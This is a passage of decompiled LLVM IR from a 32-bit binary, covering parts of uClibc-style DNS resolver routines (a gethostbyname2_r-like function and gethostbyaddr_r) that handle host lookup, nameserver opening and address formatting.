  br i1 %v1_805e1b5, label %dec_label_pc_805e1e4, label %dec_label_pc_805e1b7

dec_label_pc_805e1b7:                             ; preds = %entry
  store i32 %tmp11, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805e1d7 = inttoptr i32 %tmp10 to i32*
  %v8_805e1d7 = call i32 @gethostbyname_r(i32 %tmp9, i32* %v7_805e1d7, i32 %tmp13, i32 %tmp11, i32 %tmp12, i32 %tmp15, i32 %tmp15)
  store i32 %v8_805e1d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e1e4:                             ; preds = %entry
  %v9_805e1e4 = icmp eq i32 %tmp15, 10
  %v1_805e1e7 = icmp eq i1 %v9_805e1e4, false
  br i1 %v1_805e1e7, label %dec_label_pc_805e491, label %dec_label_pc_805e1ed

dec_label_pc_805e1ed:                             ; preds = %dec_label_pc_805e1e4
  %v3_805e1ed = call i32 @__open_nameservers(i32 %v0_805e19f, i32 %v0_805e19e, i32 %v0_805e19d)
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805e1f9 = inttoptr i32 %tmp11 to i32*
  store i32 0, i32* %v1_805e1f9, align 4
  %v4_805e1ff = icmp eq i32 %tmp9, 0
  br i1 %v4_805e1ff, label %dec_label_pc_805e491, label %dec_label_pc_805e20a

dec_label_pc_805e20a:                             ; preds = %dec_label_pc_805e1ed
  %v0_805e20a = load i32, i32* %stack_var_-140, align 4
  %v1_805e20a = call i32 @__errno_location(i32 %v0_805e20a)
  store i32 %v1_805e20a, i32* %eax.global-to-local, align 4
  store i32 %v1_805e20a, i32* @ebx, align 4
  %v1_805e211 = inttoptr i32 %v1_805e20a to i32*
  %v2_805e211 = load i32, i32* %v1_805e211, align 4
  store i32 %v2_805e211, i32* @edi, align 4
  store i32 0, i32* %v1_805e211, align 4
  %v0_805e228 = load i32, i32* @esi, align 4
  store i32 %v0_805e228, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805e23a = call i32 @__get_hosts_byname_r(i32 %tmp9, i32 10, i32 %tmp10, i32 %v0_805e228, i32 %tmp11, i32 %tmp12, i32 %v1_805e20a)
  store i32 %v7_805e23a, i32* %eax.global-to-local, align 4
  %v1_805e242 = icmp eq i32 %v7_805e23a, 0
  br i1 %v1_805e242, label %dec_label_pc_805e4c3, label %dec_label_pc_805e24a

dec_label_pc_805e24a:                             ; preds = %dec_label_pc_805e20a
  store i32 %tmp12, i32* @ecx, align 4
  %v1_805e251 = inttoptr i32 %tmp12 to i32*
  %v2_805e251 = load i32, i32* %v1_805e251, align 4
  store i32 %v2_805e251, i32* %edx.global-to-local, align 4
  %v9_805e253 = icmp eq i32 %v2_805e251, 1
  br i1 %v9_805e253, label %dec_label_pc_805e266, label %dec_label_pc_805e258

dec_label_pc_805e258:                             ; preds = %dec_label_pc_805e24a
  %v9_805e258 = icmp eq i32 %v2_805e251, 4
  br i1 %v9_805e258, label %dec_label_pc_805e286, label %dec_label_pc_805e25d

dec_label_pc_805e25d:                             ; preds = %dec_label_pc_805e258
  %v1_805e25d = add i32 %v2_805e251, 1
  %v8_805e25d = icmp eq i32 %v1_805e25d, 0
  store i32 %v1_805e25d, i32* %edx.global-to-local, align 4
  %v1_805e25e = icmp eq i1 %v8_805e25d, false
  br i1 %v1_805e25e, label %dec_label_pc_805e4c3, label %dec_label_pc_805e275

dec_label_pc_805e266:                             ; preds = %dec_label_pc_805e24a
  %v9_805e266 = icmp eq i32 %v7_805e23a, 2
  %v1_805e269 = zext i1 %v9_805e266 to i32
  store i32 %v1_805e269, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e286

dec_label_pc_805e275:                             ; preds = %dec_label_pc_805e25d
  %v0_805e275 = load i32, i32* @ebx, align 4
  %v1_805e275 = inttoptr i32 %v0_805e275 to i32*
  %v2_805e275 = load i32, i32* %v1_805e275, align 4
  %v11_805e275 = icmp eq i32 %v2_805e275, 2
  %v1_805e278 = icmp eq i1 %v11_805e275, false
  br i1 %v1_805e278, label %dec_label_pc_805e4c3, label %dec_label_pc_805e286

dec_label_pc_805e286:                             ; preds = %dec_label_pc_805e258, %dec_label_pc_805e275, %dec_label_pc_805e266
  %storemerge = phi i32 [ %v1_805e269, %dec_label_pc_805e266 ], [ 0, %dec_label_pc_805e275 ], [ 0, %dec_label_pc_805e258 ]
  %v0_805e286 = load i32, i32* @edi, align 4
  %v1_805e286 = load i32, i32* @ebx, align 4
  %v2_805e286 = inttoptr i32 %v1_805e286 to i32*
  store i32 %v0_805e286, i32* %v2_805e286, align 4
  %v0_805e288 = load i32, i32* @esi, align 4
  store i32 %tmp12, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805e251, align 4
  %tmp33 = icmp ult i32 %v0_805e288, 16
  br i1 %tmp33, label %dec_label_pc_805e4be, label %dec_label_pc_805e29e

dec_label_pc_805e29e:                             ; preds = %dec_label_pc_805e286
  %v0_805e29e = load i32, i32* @esi, align 4
  %v1_805e29e = add i32 %v0_805e29e, -16
  store i32 %v1_805e29e, i32* %eax.global-to-local, align 4
  %tmp34 = icmp ult i32 %v1_805e29e, 8
  br i1 %tmp34, label %dec_label_pc_805e4be, label %dec_label_pc_805e2aa

dec_label_pc_805e2aa:                             ; preds = %dec_label_pc_805e29e
  store i32 %tmp10, i32* @ecx, align 4
  %v1_805e2b2 = add i32 %tmp10, 16
  store i32 %v1_805e2b2, i32* %edx.global-to-local, align 4
  %v1_805e2b5 = add i32 %v0_805e29e, -24
  store i32 %v1_805e2b5, i32* @esi, align 4
  %v3_805e2c0 = inttoptr i32 %v1_805e2b2 to i32*
  store i32 %tmp10, i32* %v3_805e2c0, align 4
  %v0_805e2c3 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e2c3 = add i32 %v0_805e2c3, 4
  %v2_805e2c3 = inttoptr i32 %v1_805e2c3 to i32*
  store i32 0, i32* %v2_805e2c3, align 4
  %tmp35 = icmp ult i32 %v1_805e2b5, 256
  br i1 %tmp35, label %dec_label_pc_805e4be, label %dec_label_pc_805e2d8

dec_label_pc_805e2d8:                             ; preds = %dec_label_pc_805e2aa
  %v0_805e2d9 = load i32, i32* @ecx, align 4
  %v1_805e2e3 = add i32 %v0_805e2d9, 24
  store i32 %v1_805e2e3, i32* @edi, align 4
  store i32 %v1_805e2e3, i32* %stack_var_-124, align 4
  %v3_805e2e7 = inttoptr i32 %v1_805e2e3 to i8*
  %v4_805e2e7 = call i32 @strncpy(i8* %v3_805e2e7, i32 %tmp9, i32 %v1_805e2b5)
  store i32 %v4_805e2e7, i32* %eax.global-to-local, align 4
  store i32 10, i32* %stack_var_-124, align 4
  %v3_805e2fc = inttoptr i32 %tmp9 to i8*
  %v4_805e2fc = call i32 @inet_pton(i32 10, i8* %v3_805e2fc, i32 %tmp10)
  store i32 %v4_805e2fc, i32* %eax.global-to-local, align 4
  %v1_805e304 = icmp eq i32 %v4_805e2fc, 0
  br i1 %v1_805e304, label %dec_label_pc_805e33d, label %dec_label_pc_805e308

dec_label_pc_805e308:                             ; preds = %dec_label_pc_805e2d8
  %v0_805e308 = load i32, i32* @edi, align 4
  %v1_805e308 = load i32, i32* @ebp, align 4
  %v2_805e308 = inttoptr i32 %v1_805e308 to i32*
  store i32 %v0_805e308, i32* %v2_805e308, align 4
  %v0_805e30b = load i32, i32* @ebp, align 4
  %v1_805e30b = add i32 %v0_805e30b, 8
  %v2_805e30b = inttoptr i32 %v1_805e30b to i32*
  store i32 10, i32* %v2_805e30b, align 4
  %v0_805e312 = load i32, i32* @ebp, align 4
  %v1_805e312 = add i32 %v0_805e312, 12
  %v2_805e312 = inttoptr i32 %v1_805e312 to i32*
  store i32 16, i32* %v2_805e312, align 4
  %v1_805e31d = load i32, i32* @ebp, align 4
  %v2_805e31d = add i32 %v1_805e31d, 16
  %v3_805e31d = inttoptr i32 %v2_805e31d to i32*
  store i32 %v1_805e2b2, i32* %v3_805e31d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_805e329 = load i32, i32* @ebp, align 4
  store i32 %v0_805e329, i32* %v1_805e1f9, align 4
  store i32 %tmp12, i32* @ecx, align 4
  store i32 0, i32* %v1_805e251, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e33d:                             ; preds = %dec_label_pc_805e2d8
  %v4_805e33d = icmp eq i32 %storemerge, 0
  %v1_805e342 = icmp eq i1 %v4_805e33d, false
  br i1 %v1_805e342, label %dec_label_pc_805e498, label %dec_label_pc_805e348

dec_label_pc_805e348:                             ; preds = %dec_label_pc_805e33d
  %v2_805e34d = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805e34d, i32* %eax.global-to-local, align 4
  store i32 %v2_805e34d, i32* %stack_var_-124, align 4
  %v3_805e352 = bitcast i32* %stack_var_-76 to i8*
  %v4_805e352 = call i32 @__GI_memset(i8* %v3_805e352, i32 0, i32 40)
  store i32 %v4_805e352, i32* %eax.global-to-local, align 4
  %v2_805e36d = ptrtoint i32* %stack_var_-36 to i32
  %v2_805e39a = ptrtoint i32* %stack_var_-20 to i32
  %v9_805e3d8 = icmp eq i32 %tmp4, 5
  %v1_805e3db = icmp eq i1 %v9_805e3d8, false
  br label %dec_label_pc_805e362

dec_label_pc_805e362:                             ; preds = %dec_label_pc_805e406, %dec_label_pc_805e348
  %stack_var_-96.0 = phi i32 [ 0, %dec_label_pc_805e348 ], [ %v4_805e406, %dec_label_pc_805e406 ]
  store i32 %v2_805e36d, i32* @ebx, align 4
  store i32 %v2_805e36d, i32* %stack_var_-124, align 4
  %v4_805e372 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134583465, i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  store i32 %v4_805e372, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %stack_var_-124, align 4
  %v1_805e37e = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  %v2_805e383 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e383, i32* @ecx, align 4
  store i32 134583465, i32* %eax.global-to-local, align 4
  store i32 %v2_805e36d, i32* %stack_var_-124, align 4
  %v3_805e38e = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %v2_805e39a, i32* %eax.global-to-local, align 4
  store i32 %v2_805e39a, i32* %stack_var_-124, align 4
  %v0_805e3a4 = load i32, i32* @esi, align 4
  %v0_805e3a7 = load i32, i32* @edi, align 4
  store i32 %v0_805e3a7, i32* %stack_var_-140, align 4
  %v6_805e3a8 = inttoptr i32 %v0_805e3a7 to i8*
  %v7_805e3a8 = call i32 @__dns_lookup(i8* %v6_805e3a8, i32 28, i32 %v0_805e3a4, i32 ptrtoint (i32* @global_var_807e554.763 to i32), i32 %v2_805e39a, i32 %v2_805e34d)
  store i32 %v7_805e3a8, i32* %eax.global-to-local, align 4
  %v2_805e3b0 = icmp slt i32 %v7_805e3a8, 0
  br i1 %v2_805e3b0, label %dec_label_pc_805e498, label %dec_label_pc_805e3b8

dec_label_pc_805e3b8:                             ; preds = %dec_label_pc_805e362
  %v3_805e3bd = load i32, i32* %stack_var_-76, align 4
  %v0_805e3c1 = load i32, i32* @edi, align 4
  store i32 %v0_805e3c1, i32* %stack_var_-124, align 4
  %v3_805e3c2 = inttoptr i32 %v0_805e3c1 to i8*
  %v4_805e3c2 = call i32 @strncpy(i8* %v3_805e3c2, i32 %v3_805e3bd, i32 %v1_805e2b5)
  store i32 %v4_805e3c2, i32* %eax.global-to-local, align 4
  %v2_805e3c7 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e3c7, i32* @ebx, align 4
  %v3_805e3c8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e3c8, i32* %stack_var_-124, align 4
  %v1_805e3cc = call i32 @free(i32 %v3_805e3c8)
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  br i1 %v1_805e3db, label %dec_label_pc_805e41a, label %dec_label_pc_805e3dd

dec_label_pc_805e3dd:                             ; preds = %dec_label_pc_805e3b8
  %v0_805e3e1 = load i32, i32* @edi, align 4
  %v3_805e3e6 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e3e6, i32* %stack_var_-124, align 4
  %v4_805e3ea = call i32 @__decode_dotted(i32 %v3_805e3e6, i32 %tmp3, i32 %v0_805e3e1, i32 %v1_805e2b5)
  store i32 %v4_805e3ea, i32* %eax.global-to-local, align 4
  %v2_805e3ef = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e3ef, i32* @ecx, align 4
  %v3_805e3f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e3f0, i32* %stack_var_-124, align 4
  store i32 %v4_805e3ea, i32* @ebx, align 4
  %v1_805e3f6 = call i32 @free(i32 %v3_805e3f0)
  store i32 %v1_805e3f6, i32* %eax.global-to-local, align 4
  %v2_805e3fe = icmp slt i32 %v4_805e3ea, 0
  br i1 %v2_805e3fe, label %dec_label_pc_805e4ac, label %dec_label_pc_805e406

dec_label_pc_805e406:                             ; preds = %dec_label_pc_805e3dd
  %v4_805e406 = add nuw nsw i32 %stack_var_-96.0, 1
  %v7_805e40f = icmp sgt i32 %stack_var_-96.0, 4
  br i1 %v7_805e40f, label %dec_label_pc_805e4ac, label %dec_label_pc_805e362

dec_label_pc_805e41a:                             ; preds = %dec_label_pc_805e3b8
  %v9_805e41a = icmp eq i32 %tmp4, 28
  %v1_805e41d = icmp eq i1 %v9_805e41a, false
  br i1 %v1_805e41d, label %dec_label_pc_805e46e, label %dec_label_pc_805e41f

dec_label_pc_805e41f:                             ; preds = %dec_label_pc_805e41a
  store i32 %tmp10, i32* %stack_var_-124, align 4
  %v3_805e42d = inttoptr i32 %tmp10 to i16*
  %v4_805e42d = call i32 @memcpy(i16* %v3_805e42d, i32 %tmp, i32 16)
  %v0_805e432 = load i32, i32* @edi, align 4
  %v1_805e432 = load i32, i32* @ebp, align 4
  %v2_805e432 = inttoptr i32 %v1_805e432 to i32*
  store i32 %v0_805e432, i32* %v2_805e432, align 4
  %v0_805e435 = load i32, i32* @ebp, align 4
  %v1_805e435 = add i32 %v0_805e435, 8
  %v2_805e435 = inttoptr i32 %v1_805e435 to i32*
  store i32 10, i32* %v2_805e435, align 4
  %v0_805e43c = load i32, i32* @ebp, align 4
  %v1_805e43c = add i32 %v0_805e43c, 12
  %v2_805e43c = inttoptr i32 %v1_805e43c to i32*
  store i32 16, i32* %v2_805e43c, align 4
  store i32 %v1_805e2b2, i32* @ecx, align 4
  %v1_805e447 = load i32, i32* @ebp, align 4
  %v2_805e447 = add i32 %v1_805e447, 16
  %v3_805e447 = inttoptr i32 %v2_805e447 to i32*
  store i32 %v1_805e2b2, i32* %v3_805e447, align 4
  %v2_805e44a = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e44a, i32* %eax.global-to-local, align 4
  %v3_805e44b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e44b, i32* %stack_var_-124, align 4
  %v1_805e44f = call i32 @free(i32 %v3_805e44b)
  %v0_805e45b = load i32, i32* @ebp, align 4
  store i32 %v0_805e45b, i32* %v1_805e1f9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805e48c

dec_label_pc_805e46e:                             ; preds = %dec_label_pc_805e41a
  %v3_805e471 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e471, i32* %stack_var_-124, align 4
  %v1_805e475 = call i32 @free(i32 %v3_805e471)
  store i32 %tmp12, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e48c

dec_label_pc_805e48c:                             ; preds = %dec_label_pc_805e41f, %dec_label_pc_805e46e
  %storemerge1 = phi i32 [ 0, %dec_label_pc_805e41f ], [ 1, %dec_label_pc_805e46e ]
  store i32 %storemerge1, i32* %v1_805e251, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e491:                             ; preds = %dec_label_pc_805e1ed, %dec_label_pc_805e1e4
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e498:                             ; preds = %dec_label_pc_805e362, %dec_label_pc_805e33d
  store i32 1, i32* %v1_805e251, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e4ac:                             ; preds = %dec_label_pc_805e406, %dec_label_pc_805e3dd
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 3, i32* %v1_805e251, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e4be:                             ; preds = %dec_label_pc_805e2aa, %dec_label_pc_805e29e, %dec_label_pc_805e286
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e4c3

dec_label_pc_805e4c3:                             ; preds = %dec_label_pc_805e275, %dec_label_pc_805e25d, %dec_label_pc_805e20a, %dec_label_pc_805e4ac, %dec_label_pc_805e498, %dec_label_pc_805e491, %dec_label_pc_805e48c, %dec_label_pc_805e308, %dec_label_pc_805e1b7, %dec_label_pc_805e4be
  store i32 %v0_805e19f, i32* @ebx, align 4
  store i32 %v0_805e19e, i32* @esi, align 4
  store i32 %v0_805e19d, i32* @edi, align 4
  store i32 %v0_805e19c, i32* @ebp, align 4
  %v0_805e4ca = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805e4ca

; uselistorder directives
  uselistorder i32 %v4_805e3ea, { 1, 0, 2 }
  uselistorder i32 %v1_805e2b5, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_805e2b2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805e251, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805e251, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %v1_805e1f9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i32 %tmp15, { 0, 2, 3, 1, 4 }
  uselistorder i32 %tmp12, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp11, { 5, 0, 4, 3, 1, 2 }
  uselistorder i32 %tmp10, { 7, 6, 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %tmp9, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_805e4c3, { 9, 3, 4, 5, 6, 7, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_805e48c, { 1, 0 }
  uselistorder label %dec_label_pc_805e286, { 1, 2, 0 }
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = alloca i8*, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-140 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805e4cc = load i32, i32* @ebp, align 4
  %v0_805e4cd = load i32, i32* @edi, align 4
  %v0_805e4ce = load i32, i32* @esi, align 4
  store i32 %tmp35, i32* %eax.global-to-local, align 4
  %v4_805e4da = ptrtoint i8* %arg1 to i32
  store i8* %arg1, i8** %tmp, align 4
  store i32 %v4_805e4da, i32* @esi, align 4
  %v2_805e4ec = icmp eq i8* %arg1, null
  %v1_805e4ee = inttoptr i32 %tmp35 to i32*
  store i32 0, i32* %v1_805e4ee, align 4
  br i1 %v2_805e4ec, label %dec_label_pc_805e806, label %dec_label_pc_805e4fa

dec_label_pc_805e4fa:                             ; preds = %entry
  %v2_805e4fa = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805e4fa, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-120, align 4
  store i32 %v2_805e4fa, i32* %stack_var_-124, align 4
  %v4_805e504 = bitcast i32* %stack_var_-76 to i8*
  %v5_805e504 = call i32 @__GI_memset(i8* %v4_805e504, i32 0, i32 40)
  store i32 %v5_805e504, i32* %eax.global-to-local, align 4
  %v12_805e50c = icmp eq i32 %tmp31, 2
  br i1 %v12_805e50c, label %dec_label_pc_805e520, label %dec_label_pc_805e513

dec_label_pc_805e513:                             ; preds = %dec_label_pc_805e4fa
  %v12_805e513 = icmp eq i32 %tmp31, 10
  %v1_805e518 = icmp eq i1 %v12_805e513, false
  br i1 %v1_805e518, label %dec_label_pc_805e806, label %dec_label_pc_805e527

dec_label_pc_805e520:                             ; preds = %dec_label_pc_805e4fa
  %v4_805e520 = add i32 %tmp30, -4
  br label %dec_label_pc_805e52c

dec_label_pc_805e527:                             ; preds = %dec_label_pc_805e513
  %v4_805e527 = add i32 %tmp30, -16
  br label %dec_label_pc_805e52c

dec_label_pc_805e52c:                             ; preds = %dec_label_pc_805e520, %dec_label_pc_805e527
  %storemerge10.in = phi i32 [ %v4_805e520, %dec_label_pc_805e520 ], [ %v4_805e527, %dec_label_pc_805e527 ]
  %storemerge10 = icmp eq i32 %storemerge10.in, 0
  %v1_805e52c = icmp eq i1 %storemerge10, false
  br i1 %v1_805e52c, label %dec_label_pc_805e806, label %dec_label_pc_805e532

dec_label_pc_805e532:                             ; preds = %dec_label_pc_805e52c
  %v0_805e540 = load i32, i32* @ebx, align 4
  %v5_805e540 = inttoptr i32 %v0_805e540 to i8*
  store i8* %v5_805e540, i8** %stack_var_-120, align 4
  %v0_805e541 = load i32, i32* @ebp, align 4
  store i32 %v0_805e541, i32* %stack_var_-124, align 4
  %tmp53 = bitcast i8** %tmp to i32*
  %v0_805e5573 = load i32, i32* %tmp53, align 4
  %tmp54 = bitcast i8** %stack_var_-140 to i32*
  store i32 %v0_805e5573, i32* %tmp54, align 4
  %v10_805e558 = call i32 @__get_hosts_byaddr_r(i32 %v0_805e5573, i32 %tmp30, i32 %tmp31, i32 %tmp28, i32 %v0_805e540, i32 %tmp35, i32 %tmp29)
  store i32 %v10_805e558, i32* %eax.global-to-local, align 4
  %v1_805e560 = icmp eq i32 %v10_805e558, 0
  br i1 %v1_805e560, label %dec_label_pc_805e838, label %dec_label_pc_805e568

dec_label_pc_805e568:                             ; preds = %dec_label_pc_805e532
  store i32 %tmp29, i32* @ecx, align 4
  %v1_805e56f = inttoptr i32 %tmp29 to i32*
  %v2_805e56f = load i32, i32* %v1_805e56f, align 4
  store i32 %v2_805e56f, i32* %edx.global-to-local, align 4
  %v9_805e571 = icmp eq i32 %v2_805e56f, 1
  br i1 %v9_805e571, label %dec_label_pc_805e57f, label %dec_label_pc_805e576

dec_label_pc_805e576:                             ; preds = %dec_label_pc_805e568
  %v9_805e576 = icmp eq i32 %v2_805e56f, 4
  %v1_805e579 = icmp eq i1 %v9_805e576, false
  br i1 %v1_805e579, label %dec_label_pc_805e838, label %dec_label_pc_805e57f

dec_label_pc_805e57f:                             ; preds = %dec_label_pc_805e576, %dec_label_pc_805e568
  %v0_805e57f = load i8*, i8** %stack_var_-140, align 4
  %v1_805e57f = ptrtoint i8* %v0_805e57f to i32
  %v5_805e57f = call i32 @__open_nameservers(i32 %v1_805e57f, i32 %tmp30, i32 %tmp31)
  store i32 %tmp29, i32* %eax.global-to-local, align 4
  %v0_805e58b = load i32, i32* @ebx, align 4
  store i32 -1, i32* %v1_805e56f, align 4
  %tmp66 = icmp ult i32 %v0_805e58b, 4
  br i1 %tmp66, label %dec_label_pc_805e833, label %dec_label_pc_805e59a

dec_label_pc_805e59a:                             ; preds = %dec_label_pc_805e57f
  %v0_805e59a = load i32, i32* @ebx, align 4
  %v1_805e59a = add i32 %v0_805e59a, -4
  store i32 %v1_805e59a, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i32 %v1_805e59a, 8
  br i1 %tmp67, label %dec_label_pc_805e833, label %dec_label_pc_805e5a6

dec_label_pc_805e5a6:                             ; preds = %dec_label_pc_805e59a
  %v1_805e5a6 = add i32 %v0_805e59a, -12
  store i32 %v1_805e5a6, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i32 %v1_805e5a6, 32
  br i1 %tmp68, label %dec_label_pc_805e833, label %dec_label_pc_805e5b2

dec_label_pc_805e5b2:                             ; preds = %dec_label_pc_805e5a6
  %tmp69 = icmp ult i32 %v0_805e59a, 16
  br i1 %tmp69, label %dec_label_pc_805e833, label %dec_label_pc_805e5bb

dec_label_pc_805e5bb:                             ; preds = %dec_label_pc_805e5b2
  %v1_805e5bb = add i32 %v0_805e59a, -16
  store i32 %v1_805e5bb, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v1_805e5bb, 8
  br i1 %tmp70, label %dec_label_pc_805e833, label %dec_label_pc_805e5c7

dec_label_pc_805e5c7:                             ; preds = %dec_label_pc_805e5bb
  %v0_805e5c7 = load i32, i32* @ebp, align 4
  %v1_805e5c7 = add i32 %v0_805e5c7, 4
  %v1_805e5ca = add i32 %v0_805e59a, -44
  %v1_805e5d5 = add i32 %v0_805e5c7, 12
  %v1_805e5d8 = add i32 %v0_805e5c7, 16
  store i32 %v1_805e5d8, i32* %edx.global-to-local, align 4
  %v1_805e5db = add i32 %v0_805e59a, -24
  store i32 %v1_805e5db, i32* %eax.global-to-local, align 4
  %v10_805e5e6 = icmp ult i32 %v1_805e5db, %v1_805e5ca
  %storemerge19.v = select i1 %v10_805e5e6, i32 24, i32 44
  %storemerge19 = add i32 %v0_805e5c7, %storemerge19.v
  %stack_var_-92.0 = select i1 %v10_805e5e6, i32 %v1_805e5db, i32 %v1_805e5ca
  store i32 %storemerge19, i32* @edi, align 4
  %tmp71 = icmp ult i32 %stack_var_-92.0, 256
  br i1 %tmp71, label %dec_label_pc_805e833, label %dec_label_pc_805e606

dec_label_pc_805e606:                             ; preds = %dec_label_pc_805e5c7
  %v1_805e60b = icmp eq i1 %v12_805e50c, false
  %v0_805e6496 = load i32, i32* %tmp53, align 4
  %tmp58 = bitcast i8** %stack_var_-120 to i32*
  store i32 %v0_805e6496, i32* %tmp58, align 4
  store i32 %v0_805e5c7, i32* %stack_var_-124, align 4
  %tmp59 = inttoptr i32 %v0_805e6496 to i16*
  br i1 %v1_805e60b, label %dec_label_pc_805e644, label %dec_label_pc_805e60d

dec_label_pc_805e60d:                             ; preds = %dec_label_pc_805e606
  %v5_805e614 = call i32 @memcpy(i16* %tmp59, i32 %tmp30, i32 %v1_805e5d5)
  %v0_805e61d = load i32, i32* @ebp, align 4
  %v2_805e61d = inttoptr i32 %v1_805e5c7 to i32*
  store i32 %v0_805e61d, i32* %v2_805e61d, align 4
  %v2_805e61f = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e61f, i32* %eax.global-to-local, align 4
  %v2_805e620 = load i8*, i8** %stack_var_-120, align 4
  %v3_805e620 = ptrtoint i8* %v2_805e620 to i32
  store i32 %v3_805e620, i32* %edx.global-to-local, align 4
  %v0_805e621 = load i8*, i8** %tmp, align 4
  %v3_805e621 = load i8, i8* %v0_805e621, align 1
  %v4_805e621 = zext i8 %v3_805e621 to i32
  store i32 %v4_805e621, i32* %eax.global-to-local, align 4
  %v5_805e624 = inttoptr i32 %v4_805e621 to i8*
  store i8* %v5_805e624, i8** %stack_var_-120, align 4
  %v1_805e625 = ptrtoint i8* %v0_805e621 to i32
  %v2_805e625 = add i32 %v1_805e625, 1
  %v3_805e625 = inttoptr i32 %v2_805e625 to i8*
  %v4_805e625 = load i8, i8* %v3_805e625, align 1
  %v5_805e625 = zext i8 %v4_805e625 to i32
  store i32 %v5_805e625, i32* %eax.global-to-local, align 4
  store i32 %v5_805e625, i32* %stack_var_-124, align 4
  %v2_805e62a = add i32 %v1_805e625, 2
  %v3_805e62a = inttoptr i32 %v2_805e62a to i8*
  %v4_805e62a = load i8, i8* %v3_805e62a, align 1
  %v5_805e62a = zext i8 %v4_805e62a to i32
  store i32 %v5_805e62a, i32* %eax.global-to-local, align 4
  %v2_805e62f = add i32 %v1_805e625, 3
  %v3_805e62f = inttoptr i32 %v2_805e62f to i8*
  %v4_805e62f = load i8, i8* %v3_805e62f, align 1
  %v5_805e62f = zext i8 %v4_805e62f to i32
  store i32 %v5_805e62f, i32* %eax.global-to-local, align 4
  %v0_805e639 = load i32, i32* @edi, align 4
  %v5_805e639 = inttoptr i32 %v0_805e639 to i8*
  store i8* %v5_805e639, i8** %stack_var_-140, align 4
  %v4_805e63a = call i32 @sprintf(i32 %v0_805e639, i32 ptrtoint ([25 x i8]* @global_var_806dac8.764 to i32))
  br label %dec_label_pc_805e698

dec_label_pc_805e644:                             ; preds = %dec_label_pc_805e606
